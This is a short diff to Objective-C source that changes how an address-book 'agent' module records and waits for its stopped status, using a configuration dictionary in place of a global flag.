@@ -721,6 +721,10 @@ typedef struct _ABLogStrcut {
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
   {
     // Agent Calendar set the status to STOPPED
+#ifdef JSON_CONFIG
+    [mAgentConfiguration setObject: AGENT_STOPPED
+                            forKey: @"status"];
+#endif
     gAgentStopped = TRUE;
   }
   [outerPool release];
@@ -732,13 +736,21 @@ typedef struct _ABLogStrcut {
   
   [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
   
+#ifdef JSON_CONFIG
+  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
+         && internalCounter <= 5)
+    {
+      internalCounter++;
+      sleep(1);
+    }
+#else  
   while (gAgentStopped != TRUE &&
          internalCounter <= MAX_WAIT_TIME)
     {
       internalCounter++;
       sleep(1);
     }
-
+#endif
 #ifdef DEBUG 
   NSLog(@"Agent AddressBook stopped");
 #endif
